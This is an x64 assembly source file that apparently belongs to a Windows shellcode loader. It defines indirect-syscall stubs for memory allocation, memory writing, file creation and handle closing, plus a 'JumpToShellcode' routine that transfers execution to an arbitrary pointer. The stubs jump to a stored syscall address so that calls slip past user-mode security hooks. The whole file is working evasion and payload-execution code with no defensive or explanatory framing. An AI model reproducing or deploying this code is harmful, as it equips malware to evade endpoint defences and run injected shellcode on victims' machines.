public SyscallZwAlloacteVirtualMemory
public GetSyscallAddr
public GetSyscall
public SyscallNtClose
public SyscallNtCreateFile
public SyscallNtWriteVirtualMemory
public JumpToShellcode
public SycallNtCreateFile


.data
	systemCall dword 000h
	syscallAddr qword 0h

.code 

	JumpToShellcode proc
		jmp rcx
		ret
	JumpToShellcode endp

	GetSyscall proc
		mov systemCall, ecx
		ret
	GetSyscall endp

	GetSyscallAddr proc
		mov syscallAddr, rcx
		ret
	GetSyscallAddr endp

	SyscallZwAlloacteVirtualMemory proc
		mov r10, rcx
		mov eax, systemCall
		jmp syscallAddr
		ret
	SyscallZwAlloacteVirtualMemory endp

	SyscallNtClose proc
		mov r10, rcx
		mov eax, systemCall
		jmp syscallAddr
		ret
	SyscallNtClose endp

	SyscallNtCreateFile proc
		mov r10, rcx
		mov eax, systemCall
		jmp syscallAddr
		ret
	SyscallNtCreateFile endp

	SyscallNtWriteVirtualMemory proc
		mov r10, rcx
		mov eax, systemCall
		jmp syscallAddr
		ret
	SyscallNtWriteVirtualMemory endp

	SycallNtCreateFile proc
		mov r10, rcx
		mov eax, systemCall
		jmp syscallAddr
		ret
	SycallNtCreateFile endp

end